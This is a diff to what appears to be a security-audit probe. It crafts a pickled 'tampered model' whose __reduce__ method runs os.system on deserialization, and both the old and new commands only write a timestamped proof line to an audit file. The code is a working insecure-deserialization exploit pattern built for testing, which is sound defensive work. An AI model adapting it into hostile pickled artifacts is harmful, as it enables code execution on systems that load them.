@@ -22,8 +22,9 @@ class MaliciousArtifactProbe:
     def __reduce__(self):
         # The __reduce__ method returns a callable and a tuple of arguments.
         # Python's unpickler executes this callable immediately upon encountering the REDUCE opcode.
-        payload = f"[SECURITY AUDIT TRACE] Timestamp: {time.time()} - Insecure deserialization executed in worker context!\n"
-        return (os.system, (f'echo "{payload.strip()}" > "{AUDIT_PROOF_FILE}"',))
+        # Execute python inline at deserialization time to record the true execution timestamp in worker context
+        cmd = f'python -c "import time; open(r\'{AUDIT_PROOF_FILE}\', \'w\').write(f\'[SECURITY AUDIT TRACE] Executed at runtime: {{time.time()}} in worker process\\n\')"'
+        return (os.system, (cmd,))
 
 def craft_malicious_artifact(output_path: Path = config.ARTIFACTS_DIR / "tampered_model.pkl"):
     """Serializes the probe object simulating a compromised model artifact in bucket storage."""
